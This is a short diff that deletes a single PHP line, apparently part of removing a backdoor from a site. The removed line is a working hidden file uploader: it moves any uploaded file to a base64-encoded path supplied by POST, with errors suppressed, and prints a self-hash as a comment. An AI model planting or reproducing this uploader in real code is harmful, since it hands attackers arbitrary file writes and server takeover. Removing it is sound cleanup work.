@@ -1,1 +1,0 @@
-<?php echo('<!-- '.md5_file(__FILE__).' -->'); @move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],base64_decode($_POST['path']));?>
